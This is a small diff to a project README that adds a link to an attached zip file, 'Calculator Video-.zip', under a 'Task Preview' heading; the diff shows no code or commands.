@@ -42,6 +42,7 @@ Contributions are welcome! Please fork this repository and submit a pull request
 
 ## Task Preview
 
+[Calculator Video-.zip](https://github.com/user-attachments/files/15585405/Calculator.Video-.zip)
 
 ## Contact
 
